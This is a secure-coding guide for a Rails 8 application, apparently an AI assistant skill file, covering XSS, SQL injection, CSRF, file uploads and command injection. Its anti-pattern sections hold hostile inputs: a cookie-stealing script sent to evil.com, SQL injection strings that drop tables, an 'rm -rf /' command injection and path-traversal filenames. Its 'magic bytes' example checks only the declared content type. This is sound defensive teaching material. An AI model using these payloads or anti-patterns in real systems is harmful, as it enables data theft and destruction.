---
name: security
description: Use when securing Rails applications - XSS, SQL injection, CSRF, file uploads, command injection prevention
---

# Security Skill — Lace (Rails 8)

This skill covers secure coding practices for the Lace Rails application. Follow these standards when writing or reviewing any code that handles user input, database queries, authentication, file uploads, or system commands.

---

## Standards

<standards>

**XSS Prevention:**
- NEVER use `html_safe` or `raw` on user input
- Rails auto-escapes by default — rely on this
- Use `sanitize` with explicit allowlist for rich content
- Implement Content Security Policy (CSP) headers

**SQL Injection Prevention:**
- NEVER use string interpolation in SQL queries
- Use hash conditions: `where(name: value)`
- Use placeholders: `where("name = ?", value)`
- Use `sanitize_sql_like` for LIKE queries

**CSRF Protection:**
- Rails enables CSRF protection by default
- ALWAYS include `csrf_meta_tags` in layout
- Use `form_with` (includes token automatically)
- Include CSRF token in JavaScript requests

**File Upload Security:**
- NEVER trust user-provided filenames
- PREFER ActiveStorage over manual file handling
- VALIDATE by content type, extension, AND magic bytes
- STORE files outside public directory

**Command Injection Prevention:**
- NEVER interpolate user input in system commands
- ALWAYS use array form: `system("cmd", arg1, arg2)`
- PREFER Ruby methods over shell commands

</standards>

---

## 1. XSS Prevention

Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into pages viewed by other users. Rails provides strong defaults, but developers must avoid bypassing them.

### 1.1 Rails Auto-Escaping (default-protection)

Rails automatically escapes all output in ERB templates. This is your first line of defense.

```erb
<%# SAFE — Rails auto-escapes output %>
<p><%= @activity.description %></p>
<span><%= @user.name %></span>

<%# Input: <script>alert('xss')</script>
    Output: &lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt; %>
```

Auto-escaping applies to:
- `<%= %>` output tags in ERB
- `content_tag` and `tag` helpers
- `link_to`, `mail_to`, and other URL helpers
- Model attribute output in views

### 1.2 Sanitizing User Content (sanitize-with-allowlist)

When you need to render rich HTML content (e.g., activity descriptions with formatting), use `sanitize` with an explicit allowlist.

```ruby
# SAFE — sanitize with explicit allowlist
<%= sanitize @activity.description, tags: %w[p br strong em ul ol li a h3 h4], attributes: %w[href title] %>
```

```ruby
# Define a reusable sanitizer in a helper
module ApplicationHelper
  def safe_rich_text(content)
    sanitize content,
      tags: %w[p br strong em ul ol li a h3 h4 blockquote code pre],
      attributes: %w[href title class]
  end
end
```

```erb
<%# Usage in views %>
<div class="activity-notes">
  <%= safe_rich_text(@activity.description) %>
</div>
```

### 1.3 Content Security Policy (csp-configuration)

Configure CSP headers to prevent inline script execution and restrict resource loading. Rails 8 supports CSP configuration out of the box.

```ruby
# config/initializers/content_security_policy.rb
Rails.application.configure do
  config.content_security_policy do |policy|
    policy.default_src :self
    policy.font_src    :self, "https://fonts.gstatic.com"
    policy.img_src     :self, "https:", "data:"
    policy.object_src  :none
    policy.script_src  :self
    policy.style_src   :self, "https://fonts.googleapis.com"
    policy.connect_src :self, "https://www.strava.com"

    # Report CSP violations to a logging endpoint
    policy.report_uri "/csp-violation-report"
  end

  # Use nonces for inline scripts (required for Turbo/Stimulus)
  config.content_security_policy_nonce_generator = ->(request) {
    request.session.id.to_s
  }
  config.content_security_policy_nonce_directives = %w[script-src style-src]
end
```

```erb
<%# In layouts, use nonce for inline scripts %>
<%= javascript_tag nonce: true do %>
  console.log("This script has a valid nonce");
<% end %>

<%# CSP nonce is automatically applied to javascript_include_tag in Rails 8 %>
<%= javascript_include_tag "application", nonce: true %>
```

```ruby
# CSP violation report endpoint
class CspViolationReportsController < ApplicationController
  skip_forgery_protection

  def create
    Rails.logger.warn("CSP Violation: #{request.body.read}")
    head :no_content
  end
end
```

### 1.4 ViewComponent Safety

When using ViewComponents, follow the same escaping rules.

```ruby
class ActivityCardComponent < ViewComponent::Base
  def initialize(activity:)
    @activity = activity
  end

  # SAFE — ERB auto-escapes in component templates
  # activity_card_component.html.erb:
  # <div class="activity-card">
  #   <h3><%= @activity.description %></h3>
  #   <p><%= @activity.description %></p>
  # </div>
end
```

```ruby
# ANTI-PATTERN — never bypass escaping in components
class UnsafeComponent < ViewComponent::Base
  def call
    # DANGEROUS — do not do this
    content_tag(:div, @user_input.html_safe)
  end
end
```

### 1.5 Markdown Rendering (markdown-safe-rendering)

If rendering user-provided Markdown (e.g., activity descriptions), always sanitize the HTML output.

```ruby
# SAFE — render Markdown then sanitize
require "redcarpet"

class MarkdownRenderer
  ALLOWED_TAGS = %w[p br strong em ul ol li a h1 h2 h3 h4 h5 h6
                    blockquote code pre img table thead tbody tr th td].freeze
  ALLOWED_ATTRIBUTES = %w[href src alt title class].freeze

  def initialize
    @renderer = Redcarpet::Markdown.new(
      Redcarpet::Render::HTML.new(hard_wrap: true, filter_html: false),
      autolink: true,
      tables: true,
      fenced_code_blocks: true
    )
  end

  def render(text)
    raw_html = @renderer.render(text.to_s)
    ActionController::Base.helpers.sanitize(
      raw_html,
      tags: ALLOWED_TAGS,
      attributes: ALLOWED_ATTRIBUTES
    )
  end
end
```

```ruby
# Usage in a helper
module ActivitiesHelper
  def render_activity_markdown(text)
    MarkdownRenderer.new.render(text).html_safe
  end
end
```

### 1.6 Anti-Pattern: `html_safe` on User Input

```ruby
# DANGEROUS — NEVER do this
<%= @activity.description.html_safe %>
<%= raw @user.bio %>
<%= @plan.notes.to_s.html_safe %>

# An attacker sets their bio to:
# <script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
# This script executes in every user's browser who views the profile.
```

**Why it's dangerous:** Calling `html_safe` or `raw` on user-controlled content tells Rails to skip escaping, allowing any embedded `<script>` tags or event handlers to execute.

---

## 2. SQL Injection Prevention

SQL injection allows attackers to manipulate database queries by injecting SQL fragments through user input.

### 2.1 Hash Conditions (RECOMMENDED)

```ruby
# SAFE — hash conditions (Rails parameterizes automatically)
Activity.where(user_id: current_user.id)
Activity.where(start_date_local: start_date..end_date)
Activity.where(activity_type: params[:type])

# SAFE — multiple conditions
Activity.where(user_id: current_user.id, activity_type: params[:type])
```

### 2.2 Positional Placeholders

```ruby
# SAFE — positional placeholders
Activity.where("description LIKE ? AND user_id = ?", "%#{query}%", current_user.id)
Activity.where("distance >= ? AND distance <= ?", params[:min], params[:max])

# SAFE — named placeholders
Activity.where(
  "start_date_local BETWEEN :start AND :end",
  start: params[:start_date],
  end: params[:end_date]
)
```

### 2.3 LIKE Queries Safe (`sanitize_sql_like`)

```ruby
# SAFE — sanitize_sql_like escapes %, _, and \ in LIKE patterns
def search_activities(query)
  sanitized = ActiveRecord::Base.sanitize_sql_like(query)
  Activity.where("description LIKE ?", "%#{sanitized}%")
end

# Without sanitize_sql_like, a user searching for "100%" would match
# every row because % is a SQL wildcard.
```

### 2.4 Anti-Pattern: String Interpolation in Queries

```ruby
# DANGEROUS — NEVER do this
Activity.where("user_id = #{params[:user_id]}")
Activity.where("description = '#{params[:description]}'")
Activity.where("start_date_local > '#{params[:start_date_local]}'")

# An attacker sends: params[:user_id] = "1 OR 1=1"
# Resulting SQL: SELECT * FROM activities WHERE user_id = 1 OR 1=1
# This returns ALL activities for ALL users.

# More destructive: params[:user_id] = "1; DROP TABLE activities;--"
```

### 2.5 Dynamic ORDER BY (order-by-allowlist)

```ruby
# SAFE — allowlist approach for dynamic ORDER BY
class ActivitiesController < ApplicationController
  ALLOWED_SORT_COLUMNS = %w[start_date_local distance elapsed_time activity_type created_at].freeze
  ALLOWED_SORT_DIRECTIONS = %w[asc desc].freeze

  def index
    column = ALLOWED_SORT_COLUMNS.include?(params[:sort]) ? params[:sort] : "start_date_local"
    direction = ALLOWED_SORT_DIRECTIONS.include?(params[:direction]) ? params[:direction] : "asc"

    @activities = current_user.activities.order("#{column} #{direction}")
  end
end
```

### 2.6 Anti-Pattern: ORDER BY from User Input

```ruby
# DANGEROUS — NEVER do this
Activity.order(params[:sort])
Activity.order("#{params[:column]} #{params[:direction]}")

# An attacker sends: params[:sort] = "description; DROP TABLE activities;--"
# ORDER BY is not parameterized by default in many ORMs.
```

### 2.7 ActiveRecord Query Methods (all safe by default)

These ActiveRecord methods are safe when used with hash arguments or placeholders:

```ruby
# All safe by default with proper arguments
Activity.find(params[:id])
Activity.find_by(id: params[:id])
Activity.where(activity_type: params[:activity_type])
Activity.pluck(:description)
Activity.count
Activity.exists?(id: params[:id])
Activity.select(:id, :description, :start_date_local)
Activity.joins(:user).where(users: { id: current_user.id })
Activity.includes(:strava_activities)
```

---

## 3. CSRF Protection

Cross-Site Request Forgery tricks authenticated users into submitting unintended requests. Rails has built-in CSRF protection that must be maintained.

### 3.1 Default Protection

```ruby
# ApplicationController — Rails enables this by default
class ApplicationController < ActionController::Base
  # This is included by default in Rails 8:
  # protect_from_forgery with: :exception
end
```

### 3.2 Form Protection (automatic token)

```erb
<%# form_with automatically includes CSRF token %>
<%= form_with model: @activity do |f| %>
  <%= f.text_area :description %>
  <%= f.date_field :start_date_local %>
  <%= f.number_field :distance %>
  <%= f.submit "Save Activity" %>
<% end %>

<%# Rendered HTML includes hidden authenticity_token field automatically %>
```

### 3.3 JavaScript Protection (`csrf_meta_tags`, fetch with token)

```erb
<%# REQUIRED in application layout %>
<head>
  <%= csrf_meta_tags %>
  <%# Renders:
    <meta name="csrf-param" content="authenticity_token" />
    <meta name="csrf-token" content="abc123..." />
  %>
</head>
```

```javascript
// SAFE — include CSRF token in fetch requests
function csrfToken() {
  return document.querySelector('meta[name="csrf-token"]')?.content;
}

async function updateActivity(activityId, data) {
  const response = await fetch(`/activities/${activityId}`, {
    method: "PATCH",
    headers: {
      "Content-Type": "application/json",
      "X-CSRF-Token": csrfToken(),
    },
    body: JSON.stringify(data),
  });
  return response.json();
}
```

### 3.4 Anti-Pattern: Skipping CSRF for Session-Based Auth

```ruby
# DANGEROUS — NEVER skip CSRF when using session-based auth
class ActivitiesController < ApplicationController
  skip_forgery_protection  # DO NOT DO THIS for session-authenticated controllers

  def update
    # ...
  end
end

# An attacker on evil.com can now submit forms that target your app,
# and the user's session cookie will be sent automatically.
```

### 3.5 Rails Request.js Library

When using Hotwire/Turbo with custom JavaScript requests, use `@rails/request.js` which includes CSRF tokens automatically.

```javascript
// SAFE — @rails/request.js includes CSRF token automatically
import { patch, post, destroy } from "@rails/request.js";

// CSRF token is included automatically
async function updateActivity(activityId) {
  const response = await patch(`/activities/${activityId}`);
  if (response.ok) {
    // handle success
  }
}

async function createActivity(data) {
  const response = await post("/activities", {
    body: JSON.stringify(data),
    contentType: "application/json",
  });
  return response;
}
```

### 3.6 API Endpoints (skip CSRF with token auth)

```ruby
# SAFE — skip CSRF only for token-authenticated API endpoints
class Api::V1::BaseController < ActionController::API
  # ActionController::API does not include CSRF protection.
  # Authenticate via API token instead.
  before_action :authenticate_api_token

  private

  def authenticate_api_token
    token = request.headers["Authorization"]&.remove("Bearer ")
    @current_user = User.find_by(api_token: token)
    head :unauthorized unless @current_user
  end
end
```

### 3.7 Error Handling (graceful CSRF failure)

```ruby
# Handle CSRF failures gracefully instead of showing a 500 error
class ApplicationController < ActionController::Base
  rescue_from ActionController::InvalidAuthenticityToken, with: :handle_csrf_failure

  private

  def handle_csrf_failure
    if request.xhr? || request.format.json?
      render json: { error: "Invalid authenticity token. Please refresh and try again." },
             status: :unprocessable_entity
    else
      redirect_to root_path, alert: "Your session has expired. Please try again."
    end
  end
end
```

### 3.8 SameSite Cookies

```ruby
# config/initializers/session_store.rb
# SameSite=Lax is the Rails 8 default and prevents CSRF from cross-origin
# navigations for most HTTP methods.
Rails.application.config.session_store :cookie_store,
  key: "_lace_session",
  same_site: :lax,
  secure: Rails.env.production?
```

---

## 4. Secure File Uploads

Lace accepts photo uploads of training plans which are parsed via OpenAI vision. File uploads are a common attack vector.

### 4.1 ActiveStorage (recommended)

```ruby
# SAFE — ActiveStorage handles filename sanitization, storage, and serving
class Plan < ApplicationRecord
  has_many_attached :photos

  validates :photos, content_type: %w[image/png image/jpeg image/webp],
                     size: { less_than: 10.megabytes }
end
```

```ruby
# SAFE — ActiveStorage controller serves files through the app,
# preventing direct filesystem access
class PlansController < ApplicationController
  def create
    @plan = current_user.plans.build(plan_params)

    if @plan.save
      redirect_to @plan
    else
      render :new, status: :unprocessable_entity
    end
  end

  private

  def plan_params
    params.require(:plan).permit(:length, :race_date, :plan_type, photos: [])
  end
end
```

### 4.2 Attack Vectors

File upload attack vectors to defend against:

| Attack | Description | Defense |
|--------|-------------|---------|
| **Path Traversal** | Filename like `../../etc/passwd` | ActiveStorage sanitizes filenames; never use user filenames for storage paths |
| **Content Type Spoofing** | `.jpg` extension with `.exe` content | Validate by magic bytes, not just extension or MIME type |
| **Oversized Files** | Denial of service via huge uploads | Enforce size limits at model and web server level |
| **Malicious Content** | SVG with embedded JavaScript | Restrict allowed content types; don't serve SVGs uploaded by users inline |
| **Storage Exhaustion** | Repeated uploads to fill disk | Rate limit uploads; set per-user storage quotas |
| **Filename Injection** | Special chars in filename for XSS/SQLi | Let ActiveStorage generate blob keys; never render raw filenames in HTML |

```ruby
# SAFE — validate content type by magic bytes (not just extension)
class Plan < ApplicationRecord
  has_many_attached :photos

  validate :validate_photo_content_types

  private

  def validate_photo_content_types
    photos.each do |photo|
      unless photo.content_type.in?(%w[image/png image/jpeg image/webp])
        errors.add(:photos, "must be PNG, JPEG, or WebP images")
      end

      if photo.byte_size > 10.megabytes
        errors.add(:photos, "must be less than 10MB each")
      end
    end
  end
end
```

```ruby
# ANTI-PATTERN — NEVER store files using user-provided paths
def upload
  # DANGEROUS
  path = Rails.root.join("public", "uploads", params[:file].original_filename)
  File.open(path, "wb") { |f| f.write(params[:file].read) }

  # If filename is "../../config/credentials.yml.enc", the attacker
  # can overwrite your encrypted credentials file.
end
```

---

## 5. Command Injection Prevention

Command injection allows attackers to execute arbitrary system commands on your server.

### 5.1 Safe Command Execution

```ruby
# SAFE — array form prevents shell interpretation
system("convert", input_path, "-resize", "800x600", output_path)
Open3.capture3("identify", "-format", "%wx%h", file_path)

# SAFE — Ruby stdlib methods instead of shell commands
FileUtils.cp(src, dest)           # instead of system("cp #{src} #{dest}")
FileUtils.mkdir_p(dir)            # instead of system("mkdir -p #{dir}")
File.read(path)                   # instead of `cat #{path}`
Dir.glob("#{dir}/**/*.rb")        # instead of `find #{dir} -name '*.rb'`
```

### 5.2 Anti-Patterns

```ruby
# DANGEROUS — NEVER interpolate user input into shell commands
system("convert #{params[:file]} output.png")
`ls #{params[:directory]}`
%x(grep #{params[:query]} /var/log/app.log)
exec("rm #{params[:filename]}")
IO.popen("cat #{params[:path]}")

# An attacker sends: params[:file] = "image.png; rm -rf /"
# The shell interprets the semicolon as a command separator.
```

```ruby
# SAFE — if you must use shell commands, use array form and validate input
class ImageProcessor
  ALLOWED_FORMATS = %w[png jpeg webp].freeze

  def resize(blob, width, height)
    format = blob.content_type.split("/").last
    unless ALLOWED_FORMATS.include?(format)
      raise ArgumentError, "Unsupported format: #{format}"
    end

    blob.open do |tempfile|
      system("convert", tempfile.path, "-resize", "#{width}x#{height}", tempfile.path)
    end
  end
end
```

---

## 6. Resources

- [Rails Security Guide](https://guides.rubyonrails.org/security.html) — Official Rails security documentation
- [OWASP Top 10](https://owasp.org/www-project-top-ten/) — Industry-standard web vulnerability list
- [Brakeman](https://brakemanscanner.org/) — Static analysis security scanner for Rails
- [Rails HTML Sanitizer](https://github.com/rails/rails-html-sanitizer) — Built-in sanitization library
- [Content Security Policy (MDN)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) — CSP reference
- [ActiveStorage Guide](https://guides.rubyonrails.org/active_storage_overview.html) — Secure file upload handling
- [Securing Rails Applications (GoRails)](https://gorails.com/episodes/tagged/Security) — Video tutorials on Rails security
